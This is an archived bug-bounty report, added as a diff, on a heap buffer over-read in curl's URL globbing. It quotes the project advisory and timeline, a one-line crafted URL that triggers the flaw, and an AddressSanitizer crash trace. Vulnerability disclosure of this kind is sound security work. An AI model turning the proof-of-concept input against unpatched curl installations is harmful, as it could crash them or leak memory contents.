@@ -1,0 +1,56 @@
+ReportLink:https://hackerone.com/reports/255587
+WeaknessName:Buffer Over-read
+Reporter:https://hackerone.com/geeknik
+ReportedTo:Data Processing (IBB)(ibb-data)
+BountyAmount:
+Severity:medium
+State:Closed
+DateOfDisclosure:16.05.2018 15:38:16
+
+Summary:
+
+**FYI, this security advisory will not be released until 9 August 2017:**
+```
+curl supports "globbing" of URLs, in which a user can pass a numerical range
+to have the tool iterate over those numbers to do a sequence of transfers.
+
+In the globbing function that parses the numerical range, there was an
+omission that made curl read a byte beyond the end of the URL if given a
+carefully crafted, or just wrongly written, URL. The URL is stored in a heap
+based buffer, so it could then be made to wrongly read something else instead
+of crashing.
+
+An example of a URL that triggers the flaw would be
+`http://ur%20[0-60000000000000000000`.
+```
+
+Reported to project maintainers:  14 June 2017
+Acknowledged: 14 June 2017
+Patched: 14 June 2017
+Released: 9 August 2017
+Advisory: 9 August 2017
+
+Stack:
+```
+curl -q http://ur%20[0-60000000000000000000
+
+curl: (6) Couldn't resolve host 'ur'
+=================================================================
+==16611==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x603000023de8 at pc 0x0000004f9ecc bp 0x7ffef3e73b50 sp 0x7ffef3e73b48
+READ of size 1 at 0x603000023de8 thread T0
+    #0 0x4f9ecb in glob_range /root/curl/src/tool_urlglob.c:282:12
+    #1 0x4f9ecb in glob_parse /root/curl/src/tool_urlglob.c:412
+    #2 0x4f9ecb in glob_url /root/curl/src/tool_urlglob.c:450
+    #3 0x4e2b37 in operate_do /root/curl/src/tool_operate.c:526:18
+    #4 0x4e076e in operate /root/curl/src/tool_operate.c:2052:20
+    #5 0x4de7d6 in main /root/curl/src/tool_main.c:252:14
+    #6 0x7fa930f74b44 in __libc_start_main /build/glibc-KShDyh/glibc-2.19/csu/libc-start.c:287
+    #7 0x4c3f1c in _start (/root/curl/src/curl+0x4c3f1c)
+
+0x603000023de8 is located 0 bytes to the right of 24-byte region [0x603000023dd0,0x603000023de8)
+allocated by thread T0 here:
+    #0 0x4a689b in malloc (/root/curl/src/curl+0x4a689b)
+    #1 0x7fa930fd4989 in __strdup /build/glibc-KShDyh/glibc-2.19/string/strdup.c:42
+
+SUMMARY: AddressSanitizer: heap-buffer-overflow /root/curl/src/tool_urlglob.c:282 glob_range
+```
